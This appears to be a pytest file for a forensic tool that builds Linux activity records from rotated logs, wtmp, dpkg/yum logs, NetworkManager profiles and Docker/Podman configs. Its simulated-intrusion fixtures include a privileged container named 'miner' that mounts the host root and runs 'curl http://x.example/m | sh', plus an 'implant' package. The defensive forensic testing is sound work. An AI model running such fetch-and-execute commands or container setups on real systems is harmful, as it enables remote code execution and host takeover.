"""More of what a Linux system records (core/activity/linux.py,
linux_system.py, linux_services.py): logrotate's compressed copies of the
auth / syslog / wtmp logs, dpkg.log and yum.log, NetworkManager's saved
connections, and Docker / Podman containers.

Every input is written here in the format the tool itself writes -- a
dpkg run's startup / install / status lines, a NetworkManager keyfile, a
Docker config.v2.json with nanosecond times -- and read end to end from a
folder laid out as a Linux root, through the same collection the
activity job runs.
"""

import bz2
import datetime
import gzip
import json
import lzma
import os
import struct

UTC = datetime.timezone.utc

AUTH_OLD = ("Mar  3 09:15:02 web sshd[811]: Accepted password for alice "
            "from 203.0.113.9 port 51022 ssh2\n")
SYSLOG_OLD = ("Mar  4 10:00:00 web sudo:    alice : TTY=pts/0 ; PWD=/home/"
              "alice ; USER=root ; COMMAND=/usr/bin/apt install nmap\n")
MESSAGES = ("Mar  5 11:00:00 web sshd[900]: Failed password for invalid "
            "user admin from 198.51.100.4 port 4242 ssh2\n")
DPKG = """2024-03-01 10:00:00 startup archives unpack
2024-03-01 10:00:01 install implant:amd64 <none> 0.1
2024-03-01 10:00:01 status half-installed implant:amd64 0.1
2024-03-01 10:00:02 startup packages configure
2024-03-01 10:00:02 configure implant:amd64 0.1 <none>
2024-03-01 10:00:02 status installed implant:amd64 0.1
2024-03-02 09:00:00 startup packages remove
2024-03-02 09:00:01 remove implant:amd64 0.1 <none>
"""
YUM = """Dec 30 10:00:00 Installed: nmap-6.40-7.el7.x86_64
Jan 02 11:00:00 Erased: nmap
"""
NM_WIFI = """[connection]
id=CoffeeShop
uuid=7b8c2a43-3f8b-4f7f-9bfe-1c6c0f9a1a11
type=wifi
permissions=user:alice;
timestamp=1709287200

[wifi]
mode=infrastructure
ssid=CoffeeShop-Guest

[wifi-security]
key-mgmt=wpa-psk
psk=hunter2-secret

[ipv4]
method=auto
"""
NM_VPN = """[connection]
id=Office VPN
uuid=11111111-2222-3333-4444-555555555555
type=vpn

[vpn]
service-type=org.freedesktop.NetworkManager.openvpn
password=vpn-secret

[ipv4]
method=manual
address1=10.8.0.6/24
"""
NM_STAMPS = ("[timestamps]\n"
             "11111111-2222-3333-4444-555555555555=1709373600\n")
DOCKER_ID = 'f' * 64
DOCKER = {
    'ID': DOCKER_ID, 'Name': '/miner',
    'Created': '2024-03-01T12:00:00.123456789Z',
    'Path': '/bin/sh', 'Args': ['-c', 'curl http://x.example/m | sh'],
    'Config': {'Image': 'alpine:3.19', 'User': 'root'},
    'State': {'Running': False, 'StartedAt': '2024-03-02T08:00:00.5Z',
              'FinishedAt': '2024-03-02T09:30:00Z', 'ExitCode': 137},
    'MountPoints': {'/host': {'Source': '/', 'Destination': '/host'}},
}
PODMAN = [{'id': 'a' * 64, 'names': ['dev-box'], 'image': 'b' * 64,
           'created': '2024-02-28T07:00:00.000000001Z'}]


def _wtmp_login(when):
    # glibc's 384-byte utmp: type 7 (user process), pid, line, id, user,
    # host, exit, session, tv_sec, tv_usec, address.
    record = struct.pack('<hxxi32s4s32s256s4xi', 7, 1234, b'pts/0',
                         b'ts/0', b'alice', b'203.0.113.9', 0)
    record += struct.pack('<ii', when, 0) + bytes(16) + bytes(20)
    return record.ljust(384, b'\0')


def _write(root, path, data, mtime=None):
    target = os.path.join(root, *path.split('/'))
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, 'wb') as handle:
        handle.write(data if isinstance(data, bytes) else data.encode())
    if mtime:
        os.utime(target, (mtime, mtime))


def _linux_root(tmp_path):
    root = str(tmp_path / 'linux')
    year_2024 = datetime.datetime(2024, 6, 1, tzinfo=UTC).timestamp()
    _write(root, 'etc/hostname', 'web\n')
    _write(root, 'home/alice/.bashrc', '')
    _write(root, 'var/log/auth.log.2.gz', gzip.compress(AUTH_OLD.encode()),
           year_2024)
    _write(root, 'var/log/syslog.3.bz2', bz2.compress(SYSLOG_OLD.encode()),
           year_2024)
    _write(root, 'var/log/messages-20240310.xz',
           lzma.compress(MESSAGES.encode()), year_2024)
    _write(root, 'var/log/wtmp.1', _wtmp_login(1709200000))
    _write(root, 'var/log/dpkg.log.1', DPKG)
    _write(root, 'var/log/yum.log', YUM,
           datetime.datetime(2024, 1, 5, tzinfo=UTC).timestamp())
    _write(root, 'etc/NetworkManager/system-connections/'
                 'CoffeeShop.nmconnection', NM_WIFI)
    _write(root, 'etc/NetworkManager/system-connections/Office VPN', NM_VPN)
    _write(root, 'var/lib/NetworkManager/timestamps', NM_STAMPS)
    _write(root, f'var/lib/docker/containers/{DOCKER_ID}/config.v2.json',
           json.dumps(DOCKER))
    _write(root, f'var/lib/docker/containers/{DOCKER_ID}/hostconfig.json',
           json.dumps({'Privileged': True}))
    _write(root, 'home/alice/.local/share/containers/storage/'
                 'overlay-containers/containers.json', json.dumps(PODMAN))
    return root


def _records(tmp_path):
    from trace_app.core.activity import collect
    from trace_app.core.image_handler import ImageHandler
    handler = ImageHandler(_linux_root(tmp_path))
    try:
        assert handler.loaded
        return collect(handler)
    finally:
        handler.close_resources()


def test_rotated_and_compressed_logs_are_read(tmp_path):
    records = _records(tmp_path)
    by = {(r['source'], r['what']): r for r in records}
    ssh = by[('syslog', 'Remote logon (SSH)')]
    assert ssh['subject'] == 'alice from 203.0.113.9'
    assert ssh['path'].endswith('auth.log.2.gz')
    assert ssh['time'].startswith('2024-03-03 09:15:02')
    sudo = by[('syslog', 'Command run as root (sudo)')]
    assert sudo['subject'] == '/usr/bin/apt install nmap'
    assert sudo['path'].endswith('syslog.3.bz2')
    failed = by[('syslog', 'Failed SSH logon')]
    assert failed['path'].endswith('messages-20240310.xz')
    (login,) = [r for r in records if r['path'].endswith('wtmp.1')]
    assert login['category'] == 'logons' and login['user'] == 'alice'
    assert login['time'].startswith('2024-02-29 09:46:40')


def test_dpkg_runs_and_yum_lines(tmp_path):
    from trace_app.core.activity.linux_system import dpkg_runs, yum_log
    first, second = dpkg_runs(DPKG)
    assert first['installed'] == ['implant'] and first['command'] == \
        'archives unpack'
    assert second['removed'] == ['implant']
    assert yum_log(YUM, 2024) == [
        (datetime.datetime(2023, 12, 30, 10, 0), 'Installed',
         'nmap-6.40-7.el7.x86_64'),
        (datetime.datetime(2024, 1, 2, 11, 0), 'Erased', 'nmap')]
    records = [r for r in _records(tmp_path)
               if r['source'] in ('dpkg log', 'yum log')]
    whats = sorted((r['source'], r['what'], r['subject']) for r in records)
    assert whats == [
        ('dpkg log', 'Software installed', 'implant'),
        ('dpkg log', 'Software removed', 'implant'),
        ('yum log', 'Software installed', 'nmap-6.40-7.el7.x86_64'),
        ('yum log', 'Software removed', 'nmap')]


def test_network_manager_profiles_never_copy_secrets(tmp_path):
    records = [r for r in _records(tmp_path)
               if r['source'] == 'NetworkManager']
    text = json.dumps(records, default=str)
    assert 'hunter2-secret' not in text and 'vpn-secret' not in text
    wifi = next(r for r in records if r['subject'] == 'CoffeeShop-Guest')
    assert wifi['what'] == 'Wi-Fi network saved'
    assert wifi['time'].startswith('2024-03-01 10:00:00')
    assert wifi['detail']['security'] == 'wpa-psk'
    assert wifi['detail']['allowed users'] == 'user:alice;'
    vpn = next(r for r in records if r['subject'] == 'Office VPN')
    # No timestamp in the profile: NetworkManager's timestamps file.
    assert vpn['time'].startswith('2024-03-02 10:00:00')
    assert vpn['detail']['addresses'] == '10.8.0.6/24'
    assert vpn['detail']['vpn'].endswith('openvpn')


def test_docker_and_podman_containers(tmp_path):
    records = [r for r in _records(tmp_path)
               if r['source'] in ('Docker', 'Podman')]
    created = next(r for r in records if r['source'] == 'Docker' and
                   r['what'] == 'Container created')
    assert created['subject'] == 'miner (alpine:3.19)'
    assert created['time'].startswith('2024-03-01 12:00:00')
    detail = created['detail']
    assert detail['command'] == '/bin/sh -c curl http://x.example/m | sh'
    assert detail['mounts'] == '/ -> /host'
    assert detail['privileged'] is True and detail['exit code'] == 137
    started = next(r for r in records if r['what'] ==
                   'Container last started')
    assert started['time'].startswith('2024-03-02 08:00:00')
    podman = next(r for r in records if r['source'] == 'Podman')
    assert podman['subject'] == 'dev-box' and podman['user'] == 'alice'
    assert podman['detail']['rootless'] == 'yes'
